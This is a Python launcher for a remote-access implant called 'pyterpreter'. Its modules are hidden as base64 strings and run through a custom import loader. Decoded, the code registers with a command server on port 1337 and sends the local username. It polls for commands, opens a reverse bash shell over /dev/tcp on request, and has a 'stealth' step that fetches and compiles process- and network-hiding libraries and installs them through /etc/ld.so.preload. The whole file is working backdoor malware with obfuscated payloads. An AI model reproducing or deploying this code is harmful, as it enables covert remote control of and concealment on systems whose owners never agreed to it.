from base64 import b64decode
import importlib.abc
import os
import sys
from typing import Dict, Optional, Tuple
import types


FINDER_AND_LOADER_MODULE_NAME = 'CUSTOM_LOADER'
DEFAULT_PACKAGE_NAME = 'pyterpreter'


class FinderAndLoader(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    def __init__(self, packages: Dict[str, Tuple[bool, str]]):
        self.packages = packages

    # TODO if this is needed in future (use sys.excepthook = self.excepthook in __init__)
    # @staticmethod
    # def excepthook(exception_type, value, traceback):
    #     import traceback as tb
    #     tb.print_exception(exception_type, value, traceback)

    def find_module(self, full_package_name: str, path: Optional[str]) -> Optional['FinderAndLoader']:
        if full_package_name in self.packages.keys():
            return self

    def load_module(self, full_package_name):
        try:
            if full_package_name in sys.modules.keys():
                return sys.modules[full_package_name]

            is_package, code = self.packages[full_package_name]

            module = types.ModuleType(full_package_name)
            module.__loader__ = self
            path = full_package_name.replace('.', '/')

            if is_package:
                module.__package__ = full_package_name
                module.__file__ = os.path.join(path, '__init__.py')
                module.__path__ = [path]
            else:
                module.__package__ = full_package_name.rsplit('.', 1)[0]
                module.__file__ = path + '.py'

            sys.modules[full_package_name] = module

            compiled_code = compile(code, module.__file__, 'exec')
            exec(compiled_code, module.__dict__)

            return module
        except Exception as ex:
            raise ImportError(f'Error loading {full_package_name} with custom loader: {ex}')


def prepare_package():
    packages: Dict[str, Tuple[bool, str]] = {
        'pyterpreter.communication': (False, 'aW1wb3J0IHVybGxpYi5lcnJvcgppbXBvcnQgdXJsbGliLnJlcXVlc3QKZnJvbSBxdWV1ZSBpbXBvcnQgU2ltcGxlUXVldWUKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZAppbXBvcnQgdGltZQoKZnJvbSBjb3JlLm1lc3NhZ2UgaW1wb3J0IE1lc3NhZ2UKCmZyb20gcHl0ZXJwcmV0ZXIgaW1wb3J0IGNvbmZpZwoKX21lc3NhZ2VzX3RvX3NlbmQ6ICdTaW1wbGVRdWV1ZVtNZXNzYWdlXScgPSBTaW1wbGVRdWV1ZSgpCm1lc3NhZ2VzX3JlY2VpdmVkOiAnU2ltcGxlUXVldWVbTWVzc2FnZV0nID0gU2ltcGxlUXVldWUoKQoKX2Jhc2VfdXJsID0gZidodHRwOi8ve2NvbmZpZy5MT0NBTF9JUH06e2NvbmZpZy5XRUJTRVJWRVJfUE9SVH0nCgoKZGVmIGluaXRpYWxpc2UoKToKICAgIGRlZiByZWNlaXZlX21lc3NhZ2VzX2ZvcmV2ZXIoKToKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHBvbGxfbWVzc2FnZXMgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKGYne19iYXNlX3VybH0vaW5zdGFuY2VzL3tjb25maWcuSU5TVEFOQ0VfSUR9JykKCiAgICAgICAgICAgIGV4Y2VwdCB1cmxsaWIuZXJyb3IuSFRUUEVycm9yIGFzIGV4OgogICAgICAgICAgICAgICAgaWYgZXguY29kZSA9PSA0MDQ6CiAgICAgICAgICAgICAgICAgICAgY3JlYXRlX2luc3RhbmNlKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgZidVbmtub3duIEhUVFAgRXJyb3I6IHtleC5jb2RlfToge2V4LnJlYXNvbn0nCgogICAgICAgICAgICBleGNlcHQgdXJsbGliLmVycm9yLlVSTEVycm9yIGFzIGV4OgogICAgICAgICAgICAgICAgaWYgbGVuKGV4LmFyZ3MpID4gMCBhbmQgaXNpbnN0YW5jZShleC5hcmdzWzBdLCBDb25uZWN0aW9uUmVmdXNlZEVycm9yKToKICAgICAgICAgICAgICAgICAgICBwYXNzICAjIGNvbm5lY3Rpb24gcmVmdXNlZCAoaWUgd2ViX3NlcnZlciBkb3duKToKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcmFpc2UgZXgKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXRhID0gcG9sbF9tZXNzYWdlcy5yZWFkKCkuZGVjb2RlKCkKICAgICAgICAgICAgICAgIGlmIGxlbihkYXRhKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZXNfcmVjZWl2ZWQucHV0KE1lc3NhZ2UuZnJvbV9zdHJpbmcoZGF0YSkpCgogICAgZGVmIHNlbmRfbWVzc2FnZXNfZm9yZXZlcigpOgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIG1lc3NhZ2UgPSBfbWVzc2FnZXNfdG9fc2VuZC5nZXQoKQogICAgICAgICAgICB1cmxsaWIucmVxdWVzdC51cmxvcGVuKGYne19iYXNlX3VybH0vaW5zdGFuY2VzL3tjb25maWcuSU5TVEFOQ0VfSUR9JywgbWVzc2FnZS50b19zdHJpbmcoKS5lbmNvZGUoKSkKCiAgICBjcmVhdGVfaW5zdGFuY2UoKQogICAgVGhyZWFkKHRhcmdldD1yZWNlaXZlX21lc3NhZ2VzX2ZvcmV2ZXIsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICBUaHJlYWQodGFyZ2V0PXNlbmRfbWVzc2FnZXNfZm9yZXZlciwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgIHByaW50KCdjb21tcyBpbml0aWFsaXNlZCcpCgoKZGVmIGNyZWF0ZV9pbnN0YW5jZSgpOgogICAgY3JlYXRlX2luc3RhbmNlX3JlcyA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4odXJsbGliLnJlcXVlc3QuUmVxdWVzdChmJ3tfYmFzZV91cmx9L2luc3RhbmNlcycsIGYne2NvbmZpZy5VU0VSTkFNRX0nLmVuY29kZSgpLCB7J0NvbnRlbnQtVHlwZSc6ICd0ZXh0L3BsYWluJ30pKQogICAgaW5zdGFuY2VfaWQgPSBjcmVhdGVfaW5zdGFuY2VfcmVzLnJlYWQoKS5kZWNvZGUoKQogICAgYXNzZXJ0IGluc3RhbmNlX2lkIGlzIG5vdCBOb25lIGFuZCBsZW4oaW5zdGFuY2VfaWQpID4gMAogICAgY29uZmlnLklOU1RBTkNFX0lEID0gaW5zdGFuY2VfaWQKICAgIHByaW50KGYnSW5zdGFuY2UgY3JlYXRlZCBhdCB7aW5zdGFuY2VfaWR9JykK'),
        'pyterpreter.message_processor': (False, 'aW1wb3J0IG9zCmZyb20gcXVldWUgaW1wb3J0IFNpbXBsZVF1ZXVlCmltcG9ydCB0ZW1wZmlsZQoKCmZyb20gY29yZS5tZXNzYWdlIGltcG9ydCBNZXNzYWdlLCBNRVNTQUdFX1BVUlBPU0UKCmZyb20gcHl0ZXJwcmV0ZXIgaW1wb3J0IGNvbmZpZwpmcm9tIHB5dGVycHJldGVyLnV0aWwgaW1wb3J0ICoKCgpkZWYgcHJvY2Vzc19tZXNzYWdlc19mb3JldmVyKG1lc3NhZ2VzX3JlY2VpdmVkX3F1ZXVlOiAnU2ltcGxlUXVldWVbTWVzc2FnZV0nKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VzX3JlY2VpdmVkX3F1ZXVlLmdldCgpCiAgICAgICAgcHJpbnQoZidSZWNlaXZlZCBtZXNzYWdlIHttZXNzYWdlfScpCgogICAgICAgIGlmIG1lc3NhZ2UucHVycG9zZSA9PSBNRVNTQUdFX1BVUlBPU0UuT1BFTl9TSEVMTDoKICAgICAgICAgICAgX2RvX29wZW5fc2hlbGwoaW50KG1lc3NhZ2UuYXJnc1swXSkpCgogICAgICAgIGVsaWYgbWVzc2FnZS5wdXJwb3NlID09IE1FU1NBR0VfUFVSUE9TRS5TVEVBTFRIOgogICAgICAgICAgICBfZG9fc3RlYWx0aCgpCgoKZGVmIF9kb19vcGVuX3NoZWxsKHBvcnQ6IGludCk6CiAgICBfcnVuX2NvbW1hbmRfZGV0YWNoZWQoZidiYXNoIC1pID4mIC9kZXYvdGNwL3tjb25maWcuTE9DQUxfSVB9L3twb3J0fSAwPiYxJykKCgpkZWYgX2RvX3N0ZWFsdGgoKToKICAgIGhhc19nY2NfY29kZSA9IHByb2Nlc3NfZ2V0X2NtZF9vdXRwdXQoJ2djYyAtLXZlcnNpb24nKVswXQogICAgbmV0d29ya19oaWRlcl9maWxlbmFtZSA9ICcvdXNyL2xvY2FsL2xpYi9saWJsZC5zbycKICAgIHByb2Nlc3NfaGlkZXJfZmlsZW5hbWUgPSAnL3Vzci9sb2NhbC9saWIvbGliYy5zbycKICAgIGlmIG5vdCBvcy5wYXRoLmlzZGlyKG9zLnBhdGguZGlybmFtZShuZXR3b3JrX2hpZGVyX2ZpbGVuYW1lKSk6CiAgICAgICAgbmV0d29ya19oaWRlcl9maWxlbmFtZSA9IHRlbXBmaWxlLm1rc3RlbXAoKVsxXQogICAgaWYgbm90IG9zLnBhdGguaXNkaXIob3MucGF0aC5kaXJuYW1lKHByb2Nlc3NfaGlkZXJfZmlsZW5hbWUpKToKICAgICAgICBwcm9jZXNzX2hpZGVyX2ZpbGVuYW1lID0gdGVtcGZpbGUubWtzdGVtcCgpWzFdCgogICAgaWYgaGFzX2djY19jb2RlID09IDA6CiAgICAgICAgcHJpbnQoJ0J1aWxkaW5nIHN0ZWFsdGggZXhwbG9pdHMgZnJvbSBzb3VyY2UnKQogICAgICAgIG5ldHdvcmtfaGlkZXJfc291cmNlX2ZkLCBuZXR3b3JrX2hpZGVyX3NvdXJjZV9maWxlbmFtZSA9IHRlbXBmaWxlLm1rc3RlbXAoc3VmZml4PScuYycpCiAgICAgICAgcHJvY2Vzc19oaWRlcl9zb3VyY2VfZmQsIHByb2Nlc3NfaGlkZXJfc291cmNlX2ZpbGVuYW1lID0gdGVtcGZpbGUubWtzdGVtcChzdWZmaXg9Jy5jJykKICAgICAgICBuZXR3b3JrX2hpZGVyX3NvdXJjZSA9IHJlc291cmNlX2dldCgnc3RlYWx0aF9uZXR3b3JrX2hpZGVyLmMnKQogICAgICAgIHByb2Nlc3NfaGlkZXJfc291cmNlID0gcmVzb3VyY2VfZ2V0KCdzdGVhbHRoX3Byb2Nlc3NfaGlkZXIuYycpCiAgICAgICAgb3Mud3JpdGUobmV0d29ya19oaWRlcl9zb3VyY2VfZmQsIG5ldHdvcmtfaGlkZXJfc291cmNlKQogICAgICAgIG9zLndyaXRlKHByb2Nlc3NfaGlkZXJfc291cmNlX2ZkLCBwcm9jZXNzX2hpZGVyX3NvdXJjZSkKICAgICAgICBvcy5jbG9zZShuZXR3b3JrX2hpZGVyX3NvdXJjZV9mZCkKICAgICAgICBvcy5jbG9zZShwcm9jZXNzX2hpZGVyX3NvdXJjZV9mZCkKCiAgICAgICAgYXNzZXJ0IDAgPT0gcHJvY2Vzc19nZXRfY21kX291dHB1dChmJ2djYyAtZlBJQyAtc2hhcmVkIC1vIHtuZXR3b3JrX2hpZGVyX2ZpbGVuYW1lfSB7bmV0d29ya19oaWRlcl9zb3VyY2VfZmlsZW5hbWV9IC1sZGwnKVswXSwgJ0J1aWxkaW5nIG5ldHdvcmsgaGlkZXIgZmFpbGVkJwogICAgICAgIGFzc2VydCAwID09IHByb2Nlc3NfZ2V0X2NtZF9vdXRwdXQoZidnY2MgLWZQSUMgLXNoYXJlZCAtbyB7cHJvY2Vzc19oaWRlcl9maWxlbmFtZX0ge3Byb2Nlc3NfaGlkZXJfc291cmNlX2ZpbGVuYW1lfSAtbGRsJylbMF0sICdCdWlsZGluZyBwcm9jZXNzIGhpZGVyIGZhaWxlZCcKCiAgICAgICAgb3MudW5saW5rKG5ldHdvcmtfaGlkZXJfc291cmNlX2ZpbGVuYW1lKQogICAgICAgIG9zLnVubGluayhwcm9jZXNzX2hpZGVyX3NvdXJjZV9maWxlbmFtZSkKCiAgICBlbHNlOgogICAgICAgIHJhaXNlIEV4Y2VwdGlvbignZ2NjIGlzIG5vdCBpbnN0YWxsZWQnKQogICAgICAgICMgbG9nKCdnY2Mgbm90IGluc3RhbGxlZCBzbyB1c2luZyBwcmVidWlsdCBsaWJyYXJpZXMnKQogICAgICAgICMgd2l0aCBvcGVuKG5ldHdvcmtfaGlkZXJfZmlsZW5hbWUsICd3YisnKSBhcyBmaDoKICAgICAgICAjICAgICBmaC53cml0ZShNZXNzYWdlUHJvY2Vzc29yLmdldF9yZXNvdXJjZSgnc3RlYWx0aCcsICduZXR3b3JrX2hpZGVyLnNvJykpCiAgICAgICAgIyAgICAgZmgudHJ1bmNhdGUoKQogICAgICAgICMgd2l0aCBvcGVuKHByb2Nlc3NfaGlkZXJfZmlsZW5hbWUsICd3YisnKSBhcyBmaDoKICAgICAgICAjICAgICBmaC53cml0ZShNZXNzYWdlUHJvY2Vzc29yLmdldF9yZXNvdXJjZSgnc3RlYWx0aCcsICdwcm9jZXNzX2hpZGVyLnNvJykpCgogICAgd2l0aCBvcGVuKCcvZXRjL2xkLnNvLnByZWxvYWQnLCAndysnKSBhcyBmaDoKICAgICAgICBmaC53cml0ZShmJ3tuZXR3b3JrX2hpZGVyX2ZpbGVuYW1lfVxue3Byb2Nlc3NfaGlkZXJfZmlsZW5hbWV9XG4nKQogICAgICAgIGZoLnRydW5jYXRlKCkKCiAgICBwcmludChmJ1N0ZWFsdGggaW5qZWN0aW9uIHN1Y2Nlc3NmdWwsIGN1cnJlbnQgcHJvY2VzcyBQSUQgaXMge29zLmdldHBpZCgpfScpCgoKZGVmIF9ydW5fY29tbWFuZF9kZXRhY2hlZChjb21tYW5kOiBzdHIpOgogICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oJy9iaW4vYmFzaCcsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkKICAgIHByb2Muc3RkaW4ud3JpdGUoZid7Y29tbWFuZH0gJlxuZXhpdFxuJy5lbmNvZGUoKSkKICAgIHByb2MuY29tbXVuaWNhdGUoKQo='),
        'pyterpreter.config': (False, 'aW1wb3J0IG9zCmltcG9ydCBwd2QKCkxPQ0FMX0lQID0gb3MuZW52aXJvblsnUFlURVJQUkVURVJfTE9DQUxfSVAnXQpXRUJTRVJWRVJfUE9SVCA9IDEzMzcKSU5TVEFOQ0VfSUQ6IHN0ciA9IE5vbmUKVVNFUk5BTUUgPSBwd2QuZ2V0cHd1aWQob3MuZ2V0dWlkKCkpLnB3X25hbWUK'),
        'pyterpreter': (True, 'aWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGZyb20gcHl0ZXJwcmV0ZXIgaW1wb3J0IGNvbmZpZwogICAgZnJvbSBweXRlcnByZXRlci5ydW4gaW1wb3J0IHJ1bgogICAgcnVuKCkK'),
        'pyterpreter.util': (False, 'aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHVybGxpYi5yZXF1ZXN0Cgpmcm9tIHB5dGVycHJldGVyIGltcG9ydCBjb25maWcKCgpkZWYgcHJvY2Vzc19nZXRfY21kX291dHB1dChjbWQ6IHN0ciwgc3RyaXBfbmV3X2xpbmU9RmFsc2UpIC0+IFtpbnQsIGJ5dGVzXToKICAgIHByb2MgPSBzdWJwcm9jZXNzLnJ1bihjbWQsIHNoZWxsPVRydWUsIHN0ZGluPXN1YnByb2Nlc3MuREVWTlVMTCwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgIGlmIHN0cmlwX25ld19saW5lIGFuZCBsZW4ocHJvYy5zdGRvdXQpID4gMCBhbmQgcHJvYy5zdGRvdXRbLTFdID09IGInXG4nWzBdOgogICAgICAgIHJldHVybiBwcm9jLnJldHVybmNvZGUsIGJ5dGVzKHByb2Muc3Rkb3V0WzotMV0pCiAgICBlbHNlOgogICAgICAgIHJldHVybiBwcm9jLnJldHVybmNvZGUsIHByb2Muc3Rkb3V0CgoKZGVmIHByb2Nlc3NfaXNfcnVubmluZ193aXRoX3BpZChwaWQ6IHN0cik6CiAgICBncmVwID0gcHJvY2Vzc19nZXRfY21kX291dHB1dChmJ3BzIC1heCAtbyBwaWQgfCBncmVwIHtwaWR9JylbMV0KICAgIHJldHVybiBsZW4oZ3JlcCkgPiAwCgoKZGVmIHJlc291cmNlX2dldChuYW1lOiBzdHIpIC0+IGJ5dGVzOgogICAgcmV0dXJuIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oZidodHRwOi8ve2NvbmZpZy5MT0NBTF9JUH06e2NvbmZpZy5XRUJTRVJWRVJfUE9SVH0vcmVzb3VyY2VzL3tuYW1lfScpLnJlYWQoKQo='),
        'pyterpreter.run': (False, 'ZnJvbSBweXRlcnByZXRlciBpbXBvcnQgY29tbXVuaWNhdGlvbiwgbWVzc2FnZV9wcm9jZXNzb3IKZnJvbSBweXRlcnByZXRlciBpbXBvcnQgY29uZmlnCgoKZGVmIHJ1bigpOgogICAgcHJpbnQoZid1c2VybmFtZSBpcyB7Y29uZmlnLlVTRVJOQU1FfScpCiAgICBjb21tdW5pY2F0aW9uLmluaXRpYWxpc2UoKQogICAgbWVzc2FnZV9wcm9jZXNzb3IucHJvY2Vzc19tZXNzYWdlc19mb3JldmVyKGNvbW11bmljYXRpb24ubWVzc2FnZXNfcmVjZWl2ZWQpCg=='),
        'core.message': (False, 'ZnJvbSB0eXBpbmcgaW1wb3J0IEl0ZXJhYmxlLCBMaXN0LCBPcHRpb25hbApmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZW5jb2RlLCBiNjRkZWNvZGUKaW1wb3J0IHJhbmRvbQppbXBvcnQgc3RyaW5nCgoKY2xhc3MgTUVTU0FHRV9QVVJQT1NFOgogICAgUElORywgT1BFTl9TSEVMTCwgUlVOX1NDUklQVCwgU1RFQUxUSCA9IFtzdHIoaSkgZm9yIGkgaW4gcmFuZ2UoNCldCgoKY2xhc3MgTWVzc2FnZToKICAgICMgc291cmNlX2luc3RhbmNlX2lkOiBzdHIKICAgICMgZGVzdGluYXRpb25faW5zdGFuY2VfaWQ6IHN0cgogICAgcHVycG9zZTogc3RyCiAgICBhcmdzOiBMaXN0W2J5dGVzXQogICAgbWVzc2FnZV9pZDogc3RyCiAgICByZXBseV9tZXNzYWdlX2lkOiBPcHRpb25hbFtzdHJdCgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHB1cnBvc2U6IHN0ciwgYXJnczogT3B0aW9uYWxbSXRlcmFibGVbYnl0ZXNdXSA9IE5vbmUsIG1lc3NhZ2VfaWQ6IHN0ciA9IE5vbmUsIHJlcGx5X21lc3NhZ2VfaWQ6IE9wdGlvbmFsW3N0cl0gPSBOb25lKToKICAgICAgICBzZWxmLnB1cnBvc2UgPSBwdXJwb3NlCiAgICAgICAgc2VsZi5hcmdzID0gbGlzdChhcmdzKSBpZiBhcmdzIGlzIG5vdCBOb25lIGVsc2UgW10KICAgICAgICBzZWxmLm1lc3NhZ2VfaWQgPSBtZXNzYWdlX2lkIGlmIG1lc3NhZ2VfaWQgaXMgbm90IE5vbmUgZWxzZSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmFzY2lpX2xldHRlcnMgKyBzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSgxNikpCiAgICAgICAgc2VsZi5yZXBseV9tZXNzYWdlX2lkID0gcmVwbHlfbWVzc2FnZV9pZAoKICAgIGRlZiB0b19zdHJpbmcoc2VsZikgLT4gc3RyOgogICAgICAgIHJldHVybiAnOicuam9pbihbYjY0ZW5jb2RlKHByb3AuZW5jb2RlKCkpLmRlY29kZSgpIGZvciBwcm9wIGluICgKICAgICAgICAgICAgc2VsZi5wdXJwb3NlLAogICAgICAgICAgICAnOicuam9pbihbYjY0ZW5jb2RlKGFyZykuZGVjb2RlKCkgZm9yIGFyZyBpbiBzZWxmLmFyZ3NdKSwKICAgICAgICAgICAgc2VsZi5tZXNzYWdlX2lkLAogICAgICAgICAgICBzZWxmLnJlcGx5X21lc3NhZ2VfaWQgaWYgc2VsZi5yZXBseV9tZXNzYWdlX2lkIGlzIG5vdCBOb25lIGVsc2UgJycKICAgICAgICApXSkKCiAgICBAY2xhc3NtZXRob2QKICAgIGRlZiBmcm9tX3N0cmluZyhjbHMsIGxpbmU6IHN0cikgLT4gJ01lc3NhZ2UnOgogICAgICAgIHByb3BzID0gW2I2NGRlY29kZShwcm9wKS5kZWNvZGUoKSBmb3IgcHJvcCBpbiBsaW5lLnNwbGl0KCc6JyldCiAgICAgICAgcHJvcHNfZm9ybWF0dGVkID0gWwogICAgICAgICAgICAgICAgcHJvcHNbMF0sCiAgICAgICAgICAgICAgICB0dXBsZShiNjRkZWNvZGUoYXJnKSBmb3IgYXJnIGluIHByb3BzWzFdLnNwbGl0KCc6JykpLAogICAgICAgICAgICAgICAgcHJvcHNbMl0sCiAgICAgICAgICAgICAgICBwcm9wc1szXSBpZiBwcm9wc1szXSAhPSAnJyBlbHNlIE5vbmUsCiAgICAgICAgXQogICAgICAgIHJldHVybiBjbHMoKnByb3BzX2Zvcm1hdHRlZCkKCiAgICBkZWYgX19zdHJfXyhzZWxmKToKICAgICAgICByZXR1cm4gZid7c2VsZi5tZXNzYWdlX2lkfTp7c2VsZi5wdXJwb3NlfTp7c2VsZi5hcmdzfScK'),
        'core': (True, ''),
    }

    for package_name in packages.keys():
        packages[package_name] = (packages[package_name][0], b64decode(packages[package_name][1].encode()).decode())

    # Add the custom FinderAndLoader (including entire source_code) to the system finder list (sys.meta_path)
    finder_and_loader = FinderAndLoader(packages)
    sys.meta_path.append(finder_and_loader)

    # Compile and run the default packages code
    default_package_code = packages[DEFAULT_PACKAGE_NAME][1]
    print(f'Running default package code\n{default_package_code}')
    default_package_init_filename = DEFAULT_PACKAGE_NAME + '/__init__.py'
    compiled_code = compile(default_package_code, default_package_init_filename, 'exec')
    new_globals = {
        '__file__': default_package_init_filename,
        '__name__': __name__,
        '__loader__': finder_and_loader,
    }
    exec(compiled_code, new_globals)


if __name__ == '__main__':
    prepare_package()
